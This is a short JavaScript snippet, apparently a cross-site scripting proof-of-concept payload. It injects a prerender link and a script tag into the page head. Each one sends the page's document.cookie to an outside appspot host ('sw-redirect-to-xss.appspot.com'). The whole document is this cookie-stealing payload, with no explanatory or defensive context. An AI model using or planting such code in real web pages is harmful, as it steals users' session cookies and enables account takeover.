var head = document.head || document.documentElement.appendChild(document.createElement('head'));
with(head.appendChild(document.createElement('link'))){
  rel='prerender';
  href='//sw-redirect-to-xss.appspot.com/cookies?cookies='+encodeURIComponent(document.cookie);
}
with(head.appendChild(document.createElement('script'))){
  src='//sw-redirect-to-xss.appspot.com/cookies?cookies='+encodeURIComponent(document.cookie);
  async=defer=true;
}
